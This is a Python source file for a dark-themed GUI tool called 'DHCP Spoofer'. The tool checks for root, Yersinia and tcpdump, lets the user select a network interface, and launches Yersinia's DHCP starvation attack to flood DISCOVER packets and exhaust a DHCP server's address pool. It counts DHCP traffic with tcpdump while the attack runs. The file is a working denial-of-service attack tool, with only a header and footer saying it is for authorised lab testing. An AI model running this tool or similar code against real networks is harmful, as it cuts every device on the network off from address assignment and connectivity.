"""
DHCP Spoofer — DHCP Starvation attack tool with a modern GUI.

Uses Yersinia to flood the network with DHCP Discover packets, exhausting
the DHCP server's IP address pool. Designed for ethical security testing
in isolated lab environments only.

Author: Jairo RC
License: MIT
"""

import logging
import os
import shutil
import signal
import subprocess
import sys
import threading
from typing import Optional

import customtkinter as ctk
import netifaces

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("DHCPSpoofer")

# ---------------------------------------------------------------------------
# GUI Theme
# ---------------------------------------------------------------------------
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
WINDOW_WIDTH: int = 600
WINDOW_HEIGHT: int = 680
YERSINIA_BIN: str = "yersinia"
DHCP_ATTACK_ID: str = "1"  # Yersinia DHCP attack mode 1 (sending DISCOVER)


# ---------------------------------------------------------------------------
# Utility Functions
# ---------------------------------------------------------------------------
def is_root() -> bool:
    """Check whether the current process has root privileges."""
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False


def yersinia_installed() -> bool:
    """Check whether Yersinia is available in PATH."""
    return shutil.which(YERSINIA_BIN) is not None


def tcpdump_installed() -> bool:
    """Check whether tcpdump is available in PATH."""
    return shutil.which("tcpdump") is not None


def get_network_interfaces() -> list[str]:
    """Return a list of non-loopback network interface names."""
    interfaces = []
    for iface in netifaces.interfaces():
        if iface == "lo":
            continue
        addrs = netifaces.ifaddresses(iface)
        # Only include interfaces that have an IPv4 or link-layer address
        if netifaces.AF_INET in addrs or netifaces.AF_LINK in addrs:
            interfaces.append(iface)
    return sorted(interfaces)


# ---------------------------------------------------------------------------
# Main Application
# ---------------------------------------------------------------------------
class DHCPSpooferApp(ctk.CTk):
    """GUI application for DHCP Starvation attacks via Yersinia.

    The application provides a modern dark-themed interface for selecting
    a network interface, launching the DHCP starvation attack, and
    monitoring Yersinia's output in real time.
    """

    def __init__(self) -> None:
        super().__init__()

        # ── Window setup ──────────────────────────────────────────────────
        self.title("DHCP Spoofer")
        self.geometry(f"{WINDOW_WIDTH}x{WINDOW_HEIGHT}")
        self.resizable(False, False)
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        # ── State ─────────────────────────────────────────────────────────
        self._process: Optional[subprocess.Popen] = None
        self._sniffer_process: Optional[subprocess.Popen] = None
        self._output_thread: Optional[threading.Thread] = None
        self._sniffer_thread: Optional[threading.Thread] = None
        self._packet_count: int = 0

        # ── Build UI ──────────────────────────────────────────────────────
        self._build_ui()

    # ── UI Construction ───────────────────────────────────────────────────

    def _build_ui(self) -> None:
        """Construct all GUI widgets."""

        # Header
        ctk.CTkLabel(
            self, text="📡  DHCP Spoofer", font=("Segoe UI", 24, "bold"),
        ).pack(pady=(18, 2))

        ctk.CTkLabel(
            self, text="DHCP Starvation via Yersinia",
            font=("Segoe UI", 12), text_color="#888888",
        ).pack(pady=(0, 12))

        # ── System checks ────────────────────────────────────────────────
        checks_frame = ctk.CTkFrame(self, fg_color="#1a1a2e", corner_radius=10)
        checks_frame.pack(padx=20, pady=5, fill="x")

        root_ok = is_root()
        yers_ok = yersinia_installed()
        tcpdump_ok = tcpdump_installed()

        root_icon = "✅" if root_ok else "❌"
        yers_icon = "✅" if yers_ok else "❌"
        tcpdump_icon = "✅" if tcpdump_ok else "❌"
        
        root_color = "#27ae60" if root_ok else "#e74c3c"
        yers_color = "#27ae60" if yers_ok else "#e74c3c"
        tcpdump_color = "#27ae60" if tcpdump_ok else "#e74c3c"

        ctk.CTkLabel(
            checks_frame, text=f"{root_icon}  Root privileges",
            font=("Segoe UI", 12), text_color=root_color,
        ).pack(pady=(8, 2), padx=15, anchor="w")

        ctk.CTkLabel(
            checks_frame, text=f"{yers_icon}  Yersinia installed",
            font=("Segoe UI", 12), text_color=yers_color,
        ).pack(pady=(2, 2), padx=15, anchor="w")

        ctk.CTkLabel(
            checks_frame, text=f"{tcpdump_icon}  tcpdump installed",
            font=("Segoe UI", 12), text_color=tcpdump_color,
        ).pack(pady=(2, 8), padx=15, anchor="w")

        # ── Interface selector ────────────────────────────────────────────
        iface_frame = ctk.CTkFrame(self, corner_radius=10)
        iface_frame.pack(padx=20, pady=8, fill="x")

        ctk.CTkLabel(
            iface_frame, text="Network Interface",
            font=("Segoe UI", 14, "bold"),
        ).pack(pady=(10, 5), padx=15, anchor="w")

        interfaces = get_network_interfaces()
        default_iface = interfaces[0] if interfaces else ""

        self._iface_var = ctk.StringVar(value=default_iface)
        self._iface_menu = ctk.CTkOptionMenu(
            iface_frame, variable=self._iface_var,
            values=interfaces if interfaces else ["No interfaces found"],
            font=("Segoe UI", 12), width=300,
        )
        self._iface_menu.pack(pady=(0, 10), padx=15, anchor="w")

        # ── Action buttons ────────────────────────────────────────────────
        btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        btn_frame.pack(padx=20, pady=8, fill="x")

        can_attack = root_ok and yers_ok and tcpdump_ok and bool(interfaces)

        self._start_btn = ctk.CTkButton(
            btn_frame, text="⚡  Start Attack",
            font=("Segoe UI", 14, "bold"),
            fg_color="#c0392b", hover_color="#e74c3c", height=42,
            command=self._start_attack,
            state="normal" if can_attack else "disabled",
        )
        self._start_btn.pack(side="left", expand=True, fill="x", padx=(0, 5))

        self._stop_btn = ctk.CTkButton(
            btn_frame, text="⏹  Stop Attack",
            font=("Segoe UI", 14, "bold"),
            fg_color="#27ae60", hover_color="#2ecc71", height=42,
            command=self._stop_attack,
            state="disabled",
        )
        self._stop_btn.pack(side="left", expand=True, fill="x", padx=(5, 0))

        # ── Status indicator & Counter ────────────────────────────────────
        self._status_frame = ctk.CTkFrame(self, fg_color="#1a1a2e", corner_radius=8)
        self._status_frame.pack(padx=20, pady=5, fill="x")
        
        # Create a grid inside status frame
        self._status_frame.grid_columnconfigure(0, weight=1)
        self._status_frame.grid_columnconfigure(1, weight=1)

        self._status_label = ctk.CTkLabel(
            self._status_frame, text="🟢  Idle — Ready to attack",
            font=("Segoe UI", 13), text_color="#aaaaaa",
        )
        self._status_label.grid(row=0, column=0, pady=15, padx=15, sticky="w")
        
        self._counter_label = ctk.CTkLabel(
            self._status_frame, text="0 PKTS",
            font=("Segoe UI", 24, "bold"), text_color="#00ff88",
        )
        self._counter_label.grid(row=0, column=1, pady=15, padx=15, sticky="e")

        # ── Output log ───────────────────────────────────────────────────
        ctk.CTkLabel(
            self, text="Live Output", font=("Segoe UI", 14, "bold"),
        ).pack(padx=20, pady=(8, 2), anchor="w")

        self._log_box = ctk.CTkTextbox(
            self, height=150, font=("Consolas", 11),
            fg_color="#0d0d1a", text_color="#00ff88",
            corner_radius=8,
        )
        self._log_box.pack(padx=20, pady=(0, 5), fill="both", expand=True)
        self._log_box.configure(state="disabled")

        # ── Footer ────────────────────────────────────────────────────────
        ctk.CTkLabel(
            self, text="⚠️  For authorized security testing only — isolated labs",
            font=("Segoe UI", 10), text_color="#555555",
        ).pack(side="bottom", pady=8)

    # ── Log Helper ────────────────────────────────────────────────────────

    def _append_log(self, text: str) -> None:
        """Append a line to the output log (thread-safe via .after)."""
        def _write() -> None:
            self._log_box.configure(state="normal")
            self._log_box.insert("end", text)
            self._log_box.see("end")
            self._log_box.configure(state="disabled")
        self.after(0, _write)

    # ── Attack Control ────────────────────────────────────────────────────

    def _start_attack(self) -> None:
        """Launch the Yersinia DHCP starvation attack."""
        if self._process is not None:
            return

        iface = self._iface_var.get()
        if not iface or iface == "No interfaces found":
            return

        try:
            cmd = [YERSINIA_BIN, "dhcp", "-attack", DHCP_ATTACK_ID, "-interface", iface]
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            logger.info("Attack started on interface %s (PID: %d)", iface, self._process.pid)
        except FileNotFoundError:
            logger.error("Yersinia binary not found.")
            self._append_log("[ERROR] Yersinia not found in PATH.\n")
            return
        except PermissionError:
            logger.error("Permission denied when launching Yersinia.")
            self._append_log("[ERROR] Permission denied. Run as root.\n")
            return

        # Update UI state
        self._status_label.configure(
            text=f"🔴  Attacking on {iface}  (PID: {self._process.pid})",
            text_color="#e74c3c",
        )
        self._status_frame.configure(fg_color="#2e1a1a")
        self._start_btn.configure(state="disabled")
        self._stop_btn.configure(state="normal")
        self._iface_menu.configure(state="disabled")
        self._packet_count = 0
        self._counter_label.configure(text="0 PKTS")

        self._append_log(f"[*] DHCP Starvation started on {iface}\n")
        self._append_log(f"[*] Yersinia PID: {self._process.pid}\n")
        self._append_log("-" * 50 + "\n")

        # Stream output in background thread
        self._output_thread = threading.Thread(
            target=self._stream_output, daemon=True,
        )
        self._output_thread.start()
        
        # Start tcpdump sniffer
        try:
            self._sniffer_process = subprocess.Popen(
                ["tcpdump", "-i", iface, "-n", "-l", "udp", "port", "67", "or", "port", "68"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True
            )
            self._sniffer_thread = threading.Thread(
                target=self._sniff_packets, daemon=True,
            )
            self._sniffer_thread.start()
            self._append_log("[*] Packet sniffer started successfully.\n")
        except Exception as exc:
            logger.error("Failed to start tcpdump: %s", exc)
            self._append_log(f"[ERROR] Failed to start packet sniffer: {exc}\n")

    def _sniff_packets(self) -> None:
        """Read tcpdump output and update the packet counter."""
        if self._sniffer_process is None or self._sniffer_process.stdout is None:
            return
            
        try:
            for line in iter(self._sniffer_process.stdout.readline, ""):
                if line:
                    self._packet_count += 1
                    self.after(0, self._update_counter)
        except Exception as exc:
            logger.error("Sniffer stream error: %s", exc)
            
    def _update_counter(self) -> None:
        """Update the packet counter label in the GUI."""
        self._counter_label.configure(text=f"{self._packet_count} PKTS")

    def _stream_output(self) -> None:
        """Read Yersinia stdout and append to the log (runs in background)."""
        if self._process is None or self._process.stdout is None:
            return

        try:
            for line in iter(self._process.stdout.readline, b""):
                decoded = line.decode("utf-8", errors="replace")
                self._append_log(decoded)
        except Exception as exc:
            logger.error("Output stream error: %s", exc)

        # Process has ended
        self.after(0, self._on_process_ended)

    def _on_process_ended(self) -> None:
        """Handle the Yersinia process ending on its own."""
        if self._process is not None:
            exit_code = self._process.poll()
            self._append_log(f"\n[*] Yersinia process ended (exit code: {exit_code})\n")
            self._process = None
            self._set_idle_state()

    def _stop_attack(self) -> None:
        """Safely terminate the Yersinia process."""
        if self._process is None:
            return

        pid = self._process.pid
        logger.info("Stopping attack (PID: %d)…", pid)
        self._append_log(f"\n[*] Stopping Yersinia (PID: {pid})…\n")

        try:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                logger.warning("Yersinia did not terminate gracefully. Sending SIGKILL.")
                self._process.kill()
                self._process.wait(timeout=3)
        except Exception as exc:
            logger.error("Error stopping process: %s", exc)
            self._append_log(f"[ERROR] Could not stop process: {exc}\n")
            
        if self._sniffer_process is not None:
            try:
                self._sniffer_process.terminate()
                self._sniffer_process.wait(timeout=2)
            except Exception:
                try:
                    self._sniffer_process.kill()
                except Exception:
                    pass
            self._sniffer_process = None

        self._process = None
        self._set_idle_state()
        self._append_log("[*] Attack stopped.\n")
        logger.info("Attack stopped.")

    def _set_idle_state(self) -> None:
        """Reset UI to idle state."""
        self._status_label.configure(
            text="🟢  Idle — Ready to attack", text_color="#aaaaaa",
        )
        self._status_frame.configure(fg_color="#1a1a2e")
        self._start_btn.configure(state="normal")
        self._stop_btn.configure(state="disabled")
        self._iface_menu.configure(state="normal")

    # ── Graceful Shutdown ─────────────────────────────────────────────────

    def _on_close(self) -> None:
        """Handle window close: kill Yersinia if still running."""
        if self._process is not None:
            logger.info("Window closing — terminating Yersinia…")
            try:
                self._process.terminate()
                self._process.wait(timeout=3)
            except Exception:
                try:
                    self._process.kill()
                except Exception:
                    pass
                    
        if self._sniffer_process is not None:
            try:
                self._sniffer_process.terminate()
            except Exception:
                pass
                
        self.destroy()


# ---------------------------------------------------------------------------
# Entry Point
# ---------------------------------------------------------------------------
def main() -> None:
    """Application entry point with pre-flight checks."""
    if not is_root():
        logger.error("This tool requires root privileges.")
        print("\n[!] ERROR: This tool must be run as root.")
        print("    Usage: sudo python3 src/dhcp_spoof.py\n")
        sys.exit(1)

    if not yersinia_installed():
        logger.error("Yersinia is not installed.")
        print("\n[!] ERROR: Yersinia is not installed or not in PATH.")
        print("    Install: sudo apt install yersinia\n")
        sys.exit(1)

    if not shutil.which("tcpdump"):
        logger.error("tcpdump is not installed.")
        print("\n[!] ERROR: tcpdump is not installed or not in PATH.")
        print("    Install: sudo apt install tcpdump\n")
        sys.exit(1)

    logger.info("DHCP Spoofer started.")
    app = DHCPSpooferApp()
    app.mainloop()


if __name__ == "__main__":
    main()